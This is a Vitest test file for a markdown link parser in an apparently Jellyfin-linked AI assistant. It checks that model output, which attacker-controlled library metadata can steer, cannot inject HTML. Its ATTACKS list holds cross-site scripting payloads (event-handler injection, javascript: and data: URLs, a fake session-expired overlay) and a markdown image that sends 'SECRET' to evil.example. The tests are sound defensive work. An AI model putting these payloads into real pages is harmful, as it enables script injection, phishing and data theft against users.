// @vitest-environment happy-dom
// SPDX-FileCopyrightText: 2026 Denis Arnst (Sapd)
// SPDX-License-Identifier: AGPL-3.0-only

/**
 * `parseMarkdownLinks` turns model output into HTML that is later sanitised and
 * injected with `{@html}`. The model's text is attacker-influenced (library
 * titles, overviews, playlist names reach its context), so a markdown link URL
 * must never be able to add attributes or elements. The output is parsed with a
 * real HTML parser and checked structurally — a string comparison would not
 * notice an attribute that only exists after parsing.
 */
import { describe, it, expect } from 'vitest';
import { parseMarkdownLinks } from './assistant-utils.js';

const TAGS = new Set(['A', 'STRONG', 'EM', 'BR']);
const A_ATTRS = new Set([
    'href',
    'target',
    'rel',
    'class',
    'data-internal-link',
    'data-jellyfin-id',
    'data-external-id',
    'data-external-provider',
    'data-media-type',
    'data-ref',
]);
const A_CLASSES = new Set([
    'text-primary-400 hover:text-primary-300 underline',
    'text-primary-400 hover:text-primary-300 underline cursor-pointer',
]);

function render(markdown: string): HTMLDivElement {
    const div = document.createElement('div');
    div.innerHTML = parseMarkdownLinks(markdown);
    return div;
}

const ATTACKS = [
    '[a](https://evil.example/" class="fixed inset-0 z-50 opacity-0 cursor-pointer" data-x="1)',
    '[a](https://evil.example/" data-internal-link="jellyfin" data-jellyfin-id="abc)',
    '[a](https://evil.example/" data-internal-link="jellyseerr" data-external-id="1" data-media-type="movie)',
    '[a](https://a.test"><span class="fixed inset-0 z-50 bg-surface-900">Session expired <a href="https://evil.example">log in</a></span>)',
    '[a](https://x" onmouseover="alert(1))',
    '[a](https://x" style="position:fixed;inset:0)',
    "[a](https://x' onfocus='alert(1))",
    '[a](ref:1:movie" data-internal-link="jellyfin)',
    '[a](javascript:alert(1))',
    '[a](JaVaScRiPt:alert(1))',
    '[a](java\tscript:alert(1))',
    '[a](data:text/html,<script>alert(1)</script>)',
    '[a](vbscript:msgbox(1))',
    '[a](//evil.example/x)',
    '[a](/\\evil.example/x)',
    '[a](/ok" class="fixed)',
    '[<img src=x onerror=alert(1)>](https://a.b)',
    '<img src=x onerror=alert(1)> **b**',
    '![x](https://evil.example/p.png?d=SECRET)',
    '[a](https://evil.example/&quot; class=&quot;x)',
];

describe('parseMarkdownLinks output structure', () => {
    for (const attack of ATTACKS) {
        it(`adds no attributes or elements for ${JSON.stringify(attack).slice(0, 70)}`, () => {
            const root = render(attack);
            for (const el of root.querySelectorAll('*')) {
                expect(TAGS.has(el.tagName), `unexpected <${el.tagName}>`).toBe(true);
            }
            for (const a of root.querySelectorAll('a')) {
                for (const attr of Array.from(a.attributes)) {
                    expect(A_ATTRS.has(attr.name), `unexpected attribute ${attr.name}`).toBe(true);
                }
                expect(A_CLASSES.has(a.getAttribute('class') ?? '')).toBe(true);
                const href = a.getAttribute('href') ?? '';
                expect(
                    href === '#' || /^https?:\/\//i.test(href) || /^\/(?![/\\])/.test(href),
                    `href ${href}`,
                ).toBe(true);
                if (a.hasAttribute('data-internal-link')) {
                    expect(href).toBe('#');
                } else {
                    expect(a.getAttribute('target')).toBe('_blank');
                    expect(a.getAttribute('rel')).toBe('noopener noreferrer');
                }
            }
        });
    }
});

describe('parseMarkdownLinks legitimate links', () => {
    it('keeps an http(s) link, unmangled', () => {
        const a = render('[docs](https://example.com/a?b=1&c=2#frag)').querySelector('a')!;
        expect(a.getAttribute('href')).toBe('https://example.com/a?b=1&c=2#frag');
        expect(a.textContent).toBe('docs');
        expect(a.getAttribute('target')).toBe('_blank');
    });

    it('keeps a same-origin path as a link, normalised', () => {
        const a = render('[browse](/browse?q=a b#x)').querySelector('a')!;
        expect(a.getAttribute('href')).toBe('/browse?q=a%20b#x');
        expect(a.getAttribute('target')).toBe('_blank');
    });

    it('does not link protocol-relative or backslash paths', () => {
        for (const url of ['//evil.example/x', '/\\evil.example/x']) {
            expect(render(`[x](${url})`).querySelector('a'), url).toBeNull();
        }
    });

    it('keeps a model ref link', () => {
        const a = render('[Die Harbor](ref:562:movie)').querySelector('a')!;
        expect(a.getAttribute('data-internal-link')).toBe('modal');
        expect(a.getAttribute('data-ref')).toBe('562:movie');
    });

    it('keeps a Jellyfin item link as an internal link', () => {
        const a = render(
            '[x](https://jf.example/web/index.html#!/details?id=abcdef0123)',
        ).querySelector('a')!;
        expect(a.getAttribute('data-internal-link')).toBe('jellyfin');
        expect(a.getAttribute('data-jellyfin-id')).toBe('abcdef0123');
    });

    it('keeps a Jellyseerr title link as an internal link', () => {
        const a = render('[x](https://seerr.example/movie/603)').querySelector('a')!;
        expect(a.getAttribute('data-internal-link')).toBe('jellyseerr');
        expect(a.getAttribute('data-external-id')).toBe('603');
        expect(a.getAttribute('data-media-type')).toBe('movie');
    });

    it('still renders bold, italics and line breaks', () => {
        expect(parseMarkdownLinks('**b** and *i*\nnext')).toBe(
            '<strong>b</strong> and <em>i</em><br>next',
        );
    });
});

it('preserves Markdown inside escaped inline and fenced code', () => {
    const div = render(
        '`**literal** [example](https://example.org/)`\n```text\n<img src=x onerror="alert(1)">\n```',
    );
    const code = div.querySelectorAll('code');
    expect(code).toHaveLength(2);
    expect(code[0].textContent).toBe('**literal** [example](https://example.org/)');
    expect(code[0].querySelector('a, strong')).toBeNull();
    expect(code[1].textContent).toContain('<img src=x onerror="alert(1)">');
    expect(div.querySelector('img')).toBeNull();
});
